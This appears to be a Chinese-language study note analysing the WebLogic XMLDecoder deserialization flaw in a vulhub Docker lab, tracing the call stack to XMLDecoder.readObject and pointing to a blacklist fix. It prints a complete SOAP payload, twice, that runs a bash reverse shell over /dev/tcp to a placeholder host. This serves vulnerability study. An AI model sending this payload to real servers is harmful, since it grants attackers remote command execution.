# Weblogic

docker-compose.yml

```
version: '2'
services:
 weblogic:
   image: vulhub/weblogic:10.3.6.0-2017
   ports:
    - "7001:7001"
    - "12345:12345"                      
```

以及相关配置：https://www.cnblogs.com/ph4nt0mer/archive/2019/10/31/11772709.html

##  XMLDecoder反序列化

[学习](https://github.com/Maskhe/javasec/blob/master/17.XMLDecoder%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.md)

看完上面师傅的流程，引发几个思考？
XMLDecoder底层工作原理？（未看）
为什么网上大量的payload弹计算器都用java.lang.ProcessBuilder这个类来触发？（`会报错异常、因为java.lang.Runtime的构造方法为private`）

## Wblogic中的XMLDecoder反序列化

```java
/wls-wsat/CoordinatorPortType    //触发路径
```

远程调试后可以断点在触发点
观察其调用栈：
![image-20221105114925440](https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202211051149504.png)

很明显知道其触发了`XMLDecoder.readObject`

payload为什么这么构造？

```
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
    <soapenv:Header>
        <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
            <java version="1.8.0_131" class="java.beans.XMLDecoder">
                <void class="java.lang.ProcessBuilder">
                    <array class="java.lang.String" length="3">
                        <void index="0">
                            <string>/bin/bash</string>
                        </void>
                        <void index="1">
                            <string>-c</string>
                        </void>
                        <void index="2">
                            <string>bash -i &gt;&amp; /dev/tcp/ip/7777 0&gt;&amp;1</string>
                        </void>
                    </array>
                    <void method="start" />
                </void>
            </java>
        </work:WorkContext>
    </soapenv:Header>
    <soapenv:Body />
</soapenv:Envelope>
```

前面一部分是因为weblogic中固定了：
![image-20221105120055622](https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202211051200713.png)

最后获取到

```
            <java version="1.8.0_131" class="java.beans.XMLDecoder">
                <void class="java.lang.ProcessBuilder">
                    <array class="java.lang.String" length="3">
                        <void index="0">
                            <string>/bin/bash</string>
                        </void>
                        <void index="1">
                            <string>-c</string>
                        </void>
                        <void index="2">
                            <string>bash -i &gt;&amp; /dev/tcp/ip/7777 0&gt;&amp;1</string>
                        </void>
                    </array>
                    <void method="start" />
                </void>
            </java>
```

![image-20221105120416082](https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202211051204250.png)

这里可以看到恶意payload被传入至`new WorkContextXmlInputAdapter()`中
也可以与最后的触发点想对应。
## 修复方式
采用添加黑名单的方式：
https://mp.weixin.qq.com/s?__biz=MzU5NDgxODU1MQ==&mid=2247485058&idx=1&sn=d22b310acf703a32d938a7087c8e8704
